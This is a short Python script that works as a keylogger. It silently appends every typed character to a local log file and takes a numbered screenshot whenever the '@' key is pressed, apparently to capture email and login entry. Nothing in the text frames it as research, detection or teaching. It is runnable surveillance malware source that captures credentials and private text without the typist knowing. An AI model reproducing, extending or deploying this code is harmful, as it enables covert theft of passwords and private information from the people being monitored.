import os
from pynput import keyboard
import pyautogui

log_file = "log.txt"  # file name to store keystrokes
i = 1

def on_press(key):
    global i  # declare 'i' as a global variable
    try:
        # Log only the pressed key without the message
        log(key.char)
        
        # Take a screenshot and save it as a PNG file if "@" key is pressed
        if key.char == "@":
            screenshot_file = f"screenshot_{i}.png"
            screenshot = pyautogui.screenshot()
            screenshot.save(screenshot_file)
            i += 1  # increment 'i' to keep track of the screenshot number
    except AttributeError:
        pass

def log(message):
    with open(log_file, "a") as f:
        f.write(message)

# Create keyboard listener
keyboard_listener = keyboard.Listener(on_press=on_press)

# Start the listener
keyboard_listener.start()

# Wait for the listener to finish
keyboard_listener.join()
